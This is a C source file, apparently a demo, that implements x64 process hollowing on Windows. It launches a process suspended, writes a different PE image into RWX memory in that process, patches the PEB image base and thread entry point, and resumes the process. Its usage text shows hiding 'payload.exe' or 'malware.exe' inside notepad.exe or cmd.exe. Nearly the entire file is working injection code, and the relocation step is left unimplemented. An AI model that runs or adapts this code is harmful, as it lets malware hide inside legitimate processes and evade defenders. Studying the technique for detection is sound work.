#include <windows.h>
#include <stdio.h>
#include "internals.h"
#include "pe.h"

/**
 * x64 进程镂空 - 基于 adamhlt/Process-Hollowing
 * 参考：https://github.com/adamhlt/Process-Hollowing
 */

/**
 * 检查 PE 是否有效
 */
BOOL IsValidPE(LPVOID lpImage) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpImage;
    PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((BYTE*)lpImage + pDosHeader->e_lfanew);

    return (pNTHeader->Signature == IMAGE_NT_SIGNATURE);
}

/**
 * x64 进程镂空主函数
 */
void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile) {
    printf("\n========== x64 进程镂空开始 ==========\n\n");

    // ===== 1. 读取源 PE 文件 =====
    printf("[1] 读取源 PE 文件：%s\n", pSourceFile);

    HANDLE hFile = CreateFileA(pSourceFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("错误：无法打开 PE 文件\n");
        return;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    LPVOID lpFileContent = HeapAlloc(GetProcessHeap(), 0, dwFileSize);

    if (!ReadFile(hFile, lpFileContent, dwFileSize, NULL, NULL)) {
        printf("错误：读取文件失败\n");
        CloseHandle(hFile);
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }
    CloseHandle(hFile);

    printf("    文件大小：%lu 字节\n", dwFileSize);

    // 验证 PE
    if (!IsValidPE(lpFileContent)) {
        printf("错误：无效的 PE 文件\n");
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }

    PIMAGE_DOS_HEADER pSourceDOS = (PIMAGE_DOS_HEADER)lpFileContent;
    PIMAGE_NT_HEADERS64 pSourceNT = (PIMAGE_NT_HEADERS64)((BYTE*)lpFileContent + pSourceDOS->e_lfanew);

    printf("    源镜像基址：0x%llX\n", pSourceNT->OptionalHeader.ImageBase);
    printf("    入口点：0x%X\n", pSourceNT->OptionalHeader.AddressOfEntryPoint);

    // ===== 2. 创建挂起的目标进程 =====
    printf("\n[2] 创建挂起进程：%s\n", pDestCmdLine);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(NULL, pDestCmdLine, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("错误：创建进程失败，错误码：%lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }

    printf("    进程 PID：%lu\n", pi.dwProcessId);

    // ===== 3. 获取线程上下文（包含 PEB 地址）=====
    printf("\n[3] 获取线程上下文\n");

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("错误：获取线程上下文失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }

    printf("    Rdx (PEB): 0x%llX\n", ctx.Rdx);

    // ===== 4. 读取目标进程的 ImageBaseAddress =====
    printf("\n[4] 读取目标进程的 ImageBaseAddress\n");

    LPVOID lpTargetImageBase = NULL;
    if (!ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10),
                          &lpTargetImageBase, sizeof(LPVOID), NULL)) {
        printf("错误：读取 ImageBaseAddress 失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }

    printf("    目标 ImageBaseAddress：0x%p\n", lpTargetImageBase);

    // ===== 5. 在目标进程分配内存 =====
    printf("\n[5] 分配新内存\n");

    // 尝试在首选基址分配
    LPVOID lpAllocAddress = VirtualAllocEx(pi.hProcess,
        (LPVOID)pSourceNT->OptionalHeader.ImageBase,
        pSourceNT->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!lpAllocAddress) {
        printf("    无法在首选基址分配，尝试任意位置...\n");
        // 如果失败，在任意位置分配
        lpAllocAddress = VirtualAllocEx(pi.hProcess, NULL,
            pSourceNT->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
    }

    if (!lpAllocAddress) {
        printf("错误：分配内存失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }

    printf("    分配地址：0x%p\n", lpAllocAddress);
    printf("    分配大小：%lu 字节\n", pSourceNT->OptionalHeader.SizeOfImage);

    // ===== 6. 更新源镜像的 ImageBase =====
    DWORD64 dwDelta = (DWORD64)lpAllocAddress - pSourceNT->OptionalHeader.ImageBase;
    pSourceNT->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;

    printf("\n[6] 基址重定位\n");
    printf("    重定位差值：0x%llX\n", dwDelta);

    // ===== 7. 写入 PE 头 =====
    printf("\n[7] 写入 PE 头\n");

    if (!WriteProcessMemory(pi.hProcess, lpAllocAddress, lpFileContent,
                           pSourceNT->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("错误：写入 PE 头失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }

    printf("    PE 头已写入\n");

    // ===== 8. 写入各个节 =====
    printf("\n[8] 写入节区\n");

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pSourceNT);
    for (int i = 0; i < pSourceNT->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(pi.hProcess,
            (LPVOID)((BYTE*)lpAllocAddress + pSection[i].VirtualAddress),
            (LPVOID)((BYTE*)lpFileContent + pSection[i].PointerToRawData),
            pSection[i].SizeOfRawData, NULL)) {
            printf("错误：写入节 %s 失败\n", pSection[i].Name);
        } else {
            printf("    写入节：%-8s -> 0x%p (%lu 字节)\n",
                pSection[i].Name,
                (LPVOID)((BYTE*)lpAllocAddress + pSection[i].VirtualAddress),
                pSection[i].SizeOfRawData);
        }
    }

    // ===== 9. 处理重定位（如果需要）=====
    if (dwDelta != 0) {
        printf("\n[9] 进行基址重定位\n");
        // 这里应该添加重定位代码，参考原始实现
        // 为了简化，暂时跳过
        printf("    警告：重定位差值非零，但未实现重定位处理\n");
    }

    // ===== 10. 写回 PEB 的 ImageBaseAddress（关键！）=====
    printf("\n[10] 更新远程 PEB\n");

    if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10),
                           &lpAllocAddress, sizeof(DWORD64), NULL)) {
        printf("错误：写入 PEB ImageBaseAddress 失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }

    printf("    已写入 ImageBaseAddress (0x%p) 到 PEB+0x10\n", lpAllocAddress);

    // ===== 11. 设置线程上下文（入口点）=====
    printf("\n[11] 设置线程入口点\n");

    DWORD64 dwEntryPoint = (DWORD64)lpAllocAddress + pSourceNT->OptionalHeader.AddressOfEntryPoint;
    ctx.Rcx = dwEntryPoint;

    printf("    入口点：0x%llX\n", dwEntryPoint);
    printf("    设置 Rcx = 0x%llX\n", ctx.Rcx);

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("错误：设置线程上下文失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, lpFileContent);
        return;
    }

    // ===== 12. 恢复线程执行 =====
    printf("\n[12] 恢复线程执行\n");

    ResumeThread(pi.hThread);

    printf("\n========== 进程镂空完成 ==========\n\n");

    // 清理
    HeapFree(GetProcessHeap(), 0, lpFileContent);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int main(int argc, char* argv[]) {
    printf("======================================\n");
    printf("   x64 进程镂空技术演示程序\n");
    printf("   Process Hollowing (x64) Demo\n");
    printf("   参考：adamhlt/Process-Hollowing\n");
    printf("======================================\n");

    if (argc < 3) {
        printf("\n用法：%s <目标进程> <源程序路径>\n", argv[0]);
        printf("\n示例：\n");
        printf("  %s notepad.exe payload.exe\n", argv[0]);
        printf("  %s cmd.exe malware.exe\n", argv[0]);
        return 1;
    }

    CreateHollowedProcess(argv[1], argv[2]);

    printf("按任意键退出...\n");
    getchar();

    return 0;
}
